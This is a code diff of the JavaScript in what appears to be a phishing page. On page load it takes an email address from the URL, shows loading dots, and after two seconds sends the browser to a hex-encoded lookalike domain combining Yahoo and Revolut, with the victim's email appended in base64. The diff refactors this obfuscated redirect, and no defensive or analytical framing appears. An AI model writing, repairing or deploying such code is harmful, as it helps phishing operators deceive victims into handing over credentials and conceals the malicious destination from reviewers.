@@ -90,15 +90,21 @@
         }
 
         // Redirect to final URL with email appended
-function redirectToTarget(base64Email) {
-    const hex = "68747470733A2F2F7961686F6F6F2D7265766F6C75742D656D61696C2D636865636B2E746F702F3F6E706E726C6F766726656D3D";
-    const obfuscatedURL = hex.match(/.{2}/g).map(byte => String.fromCharCode(parseInt(byte, 16))).join('') + base64Email;
-    window.location.href = obfuscatedURL;
-}
-               emailDisplay.innerText = emailParam.decodedValue; // Display the decoded email
+        function redirectToTarget(base64Email) {
+            const hex = "68747470733A2F2F7961686F6F6F2D7265766F6C75742D656D61696C2D636865636B2E746F702F3F6E706E726C6F766726656D3D";
+            const obfuscatedURL = hexToString(hex) + base64Email;
+            window.location.href = obfuscatedURL;
+        }
+
+        // Main execution flow
+        window.onload = function () {
+            const emailParam = findEmailParam(); // Find email from URL
+            if (emailParam) {
+                const emailDisplay = document.getElementById('emailDisplay');
+                emailDisplay.innerText = emailParam.decodedValue; // Display the decoded email
                 document.querySelector('.dots-container').style.display = 'flex'; // Show loading dots
                 setTimeout(() => {
-                    redirectToTarget(emailParam.value, emailParam.decodedValue);
+                    redirectToTarget(emailParam.value);
                 }, 2000); // Delay before redirection
             } else {
                 console.error("No valid email parameter found.");
